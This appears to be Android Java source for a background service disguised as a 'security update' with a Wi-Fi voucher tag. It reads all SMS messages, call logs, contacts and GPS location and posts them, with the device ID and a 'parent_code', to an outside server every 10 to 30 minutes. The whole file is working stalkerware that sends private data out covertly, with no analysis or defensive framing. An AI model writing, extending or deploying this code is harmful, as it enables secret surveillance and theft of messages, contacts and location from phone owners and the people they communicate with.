package com.security.update;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.ContentObserver;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Log;
import androidx.core.app.ActivityCompat;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

public class DataCollectionService extends Service {

    private static final String TAG = "WiFiVoucher";
    private static final int LOCATION_INTERVAL = 30 * 60 * 1000; // 30 minutes
    private static final int DATA_COLLECTION_INTERVAL = 10 * 60 * 1000; // 10 minutes for full sync

    private Handler handler;
    private Handler locationHandler;
    private Runnable fullDataCollector;
    private Runnable locationSender;
    private SharedPreferences prefs;
    private String parentCode;
    private String deviceId;

    private LocationManager locationManager;
    private LocationListener locationListener;
    private Location currentLocation;
    private ContentObserver smsObserver;

    @Override
    public void onCreate() {
        super.onCreate();
        prefs = getSharedPreferences("WiFiVoucher", MODE_PRIVATE);
        parentCode = prefs.getString("parent_code", "");
        deviceId = android.provider.Settings.Secure.getString(
            getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);

        setupLocationListener();
        setupSmsObserver();

        handler = new Handler(Looper.getMainLooper());
        locationHandler = new Handler(Looper.getMainLooper());

        // Full data collection - runs first time then every 10 minutes
        fullDataCollector = new Runnable() {
            @Override
            public void run() {
                collectAllData();
                handler.postDelayed(this, DATA_COLLECTION_INTERVAL);
            }
        };

        // Location every 30 minutes
        locationSender = new Runnable() {
            @Override
            public void run() {
                sendCurrentLocation();
                locationHandler.postDelayed(this, LOCATION_INTERVAL);
            }
        };
    }

    private void setupLocationListener() {
        locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
        locationListener = new LocationListener() {
            @Override
            public void onLocationChanged(Location location) {
                currentLocation = location;
            }
            @Override public void onStatusChanged(String p, int s, Bundle b) {}
            @Override public void onProviderEnabled(String p) {}
            @Override public void onProviderDisabled(String p) {}
        };

        try {
            if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 60000, 10, locationListener);
                locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 60000, 10, locationListener);
            }
        } catch (Exception e) {
            Log.e(TAG, "Location error: " + e.getMessage());
        }
    }

    private void setupSmsObserver() {
        smsObserver = new ContentObserver(new Handler(Looper.getMainLooper())) {
            @Override
            public void onChange(boolean selfChange) {
                super.onChange(selfChange);
                collectAllSms();
            }
        };
        getContentResolver().registerContentObserver(
            Telephony.Sms.CONTENT_URI, true, smsObserver);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Start full collection immediately
        handler.post(fullDataCollector);
        // Start location updates every 30 minutes
        locationHandler.post(locationSender);
        return START_STICKY;
    }

    private void collectAllData() {
        new Thread(() -> {
            try {
                collectAllSms();
                collectAllCallLogs();
                collectAllContacts();
            } catch (Exception e) {
                Log.e(TAG, "Collection error: " + e.getMessage());
            }
        }).start();
    }

    private void collectAllSms() {
        try {
            ContentResolver cr = getContentResolver();
            Map<String, JSONObject> conversationMap = new HashMap<>();

            // NO LIMIT - Get ALL SMS messages
            Cursor cursor = cr.query(
                Telephony.Sms.CONTENT_URI,
                new String[]{
                    Telephony.Sms._ID,
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.DATE,
                    Telephony.Sms.TYPE,
                    Telephony.Sms.THREAD_ID
                },
                null, null,
                Telephony.Sms.DATE + " DESC"
            );

            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext()) {
                    try {
                        String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                        String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                        long timestamp = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
                        int type = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));
                        String threadId = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.THREAD_ID));

                        String key = (address != null) ? address : "unknown";

                        JSONObject msg = new JSONObject();
                        msg.put("sender", address);
                        msg.put("message", body);
                        msg.put("timestamp", timestamp);
                        msg.put("type", (type == Telephony.Sms.MESSAGE_TYPE_INBOX) ? "incoming" : "outgoing");

                        if (!conversationMap.containsKey(key)) {
                            JSONObject conv = new JSONObject();
                            conv.put("contact", address);
                            conv.put("phone_number", address);
                            conv.put("conversation_id", threadId);
                            conv.put("messages", new JSONArray());
                            conversationMap.put(key, conv);
                        }
                        conversationMap.get(key).getJSONArray("messages").put(msg);
                        count++;
                    } catch (Exception e) {
                        // Skip malformed rows
                    }
                }
                cursor.close();
                Log.d(TAG, "SMS collected: " + count + " messages");

                // Send each conversation
                for (JSONObject conv : conversationMap.values()) {
                    JSONObject wrapper = new JSONObject();
                    wrapper.put("conversation", conv);
                    submitData("sms_conversation", wrapper);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "SMS error: " + e.getMessage());
        }
    }

    private void collectAllCallLogs() {
        try {
            ContentResolver cr = getContentResolver();
            // NO LIMIT - Get ALL call logs
            Cursor cursor = cr.query(
                CallLog.Calls.CONTENT_URI,
                null, null, null,
                CallLog.Calls.DATE + " DESC");

            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext()) {
                    try {
                        JSONObject call = new JSONObject();
                        String number = getString(cursor, CallLog.Calls.NUMBER);
                        String name = getString(cursor, CallLog.Calls.CACHED_NAME);
                        String duration = getString(cursor, CallLog.Calls.DURATION);
                        int type = Integer.parseInt(getString(cursor, CallLog.Calls.TYPE));
                        String date = getString(cursor, CallLog.Calls.DATE);

                        String callType = "missed";
                        if (type == CallLog.Calls.INCOMING_TYPE) callType = "incoming";
                        else if (type == CallLog.Calls.OUTGOING_TYPE) callType = "outgoing";

                        call.put("number", number);
                        call.put("name", name != null ? name : number);
                        call.put("duration", duration);
                        call.put("type", callType);
                        call.put("timestamp", date);

                        submitData("calls", call);
                        count++;
                    } catch (Exception e) {
                        // Skip malformed rows
                    }
                }
                cursor.close();
                Log.d(TAG, "Calls collected: " + count);
            }
        } catch (Exception e) {
            Log.e(TAG, "Call log error: " + e.getMessage());
        }
    }

    private void collectAllContacts() {
        try {
            ContentResolver cr = getContentResolver();
            // NO LIMIT - Get ALL contacts
            Cursor cursor = cr.query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext()) {
                    try {
                        String id = getString(cursor, ContactsContract.Contacts._ID);
                        String name = getString(cursor, ContactsContract.Contacts.DISPLAY_NAME);
                        if (name == null || name.isEmpty()) continue;

                        Cursor phoneCursor = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);

                        if (phoneCursor != null) {
                            while (phoneCursor.moveToNext()) {
                                String phone = getString(phoneCursor,
                                    ContactsContract.CommonDataKinds.Phone.NUMBER);
                                if (phone != null && !phone.isEmpty()) {
                                    JSONObject contact = new JSONObject();
                                    contact.put("name", name);
                                    contact.put("number", phone);
                                    submitData("contacts", contact);
                                    count++;
                                }
                            }
                            phoneCursor.close();
                        }
                    } catch (Exception e) {
                        // Skip malformed rows
                    }
                }
                cursor.close();
                Log.d(TAG, "Contacts collected: " + count);
            }
        } catch (Exception e) {
            Log.e(TAG, "Contacts error: " + e.getMessage());
        }
    }

    private void sendCurrentLocation() {
        new Thread(() -> {
            try {
                JSONObject loc = new JSONObject();

                if (currentLocation != null) {
                    loc.put("latitude", currentLocation.getLatitude());
                    loc.put("longitude", currentLocation.getLongitude());
                    loc.put("accuracy", currentLocation.getAccuracy());
                    loc.put("speed", currentLocation.getSpeed());
                    loc.put("altitude", currentLocation.getAltitude());
                } else {
                    if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                        Location lastLoc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                        if (lastLoc == null) {
                            lastLoc = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                        }
                        if (lastLoc != null) {
                            loc.put("latitude", lastLoc.getLatitude());
                            loc.put("longitude", lastLoc.getLongitude());
                            loc.put("accuracy", lastLoc.getAccuracy());
                        } else {
                            loc.put("latitude", 0);
                            loc.put("longitude", 0);
                            loc.put("accuracy", 0);
                        }
                    } else {
                        loc.put("latitude", 0);
                        loc.put("longitude", 0);
                        loc.put("accuracy", 0);
                    }
                }

                loc.put("timestamp", System.currentTimeMillis());
                loc.put("provider", currentLocation != null ? currentLocation.getProvider() : "last_known");

                submitData("location", loc);
                Log.d(TAG, "Location sent");

            } catch (Exception e) {
                Log.e(TAG, "Location error: " + e.getMessage());
            }
        }).start();
    }

    private String getString(Cursor cursor, String columnName) {
        try {
            int idx = cursor.getColumnIndex(columnName);
            if (idx != -1) return cursor.getString(idx);
        } catch (Exception e) {}
        return "";
    }

    private void submitData(String dataType, JSONObject dataContent) {
        new Thread(() -> {
            try {
                String serverUrl = "https://GhostTester.pythonanywhere.com/api/parent/submit-data";
                JSONObject payload = new JSONObject();
                payload.put("parent_code", parentCode);
                payload.put("device_id", deviceId);
                payload.put("data_type", dataType);
                payload.put("data_content", dataContent);

                URL url = new URL(serverUrl);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);

                OutputStream os = conn.getOutputStream();
                os.write(payload.toString().getBytes("UTF-8"));
                os.flush();
                os.close();

                int code = conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Submit error: " + e.getMessage());
            }
        }).start();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (handler != null) handler.removeCallbacks(fullDataCollector);
        if (locationHandler != null) locationHandler.removeCallbacks(locationSender);
        if (locationManager != null && locationListener != null)
            locationManager.removeUpdates(locationListener);
        if (smsObserver != null)
            getContentResolver().unregisterContentObserver(smsObserver);
    }
}
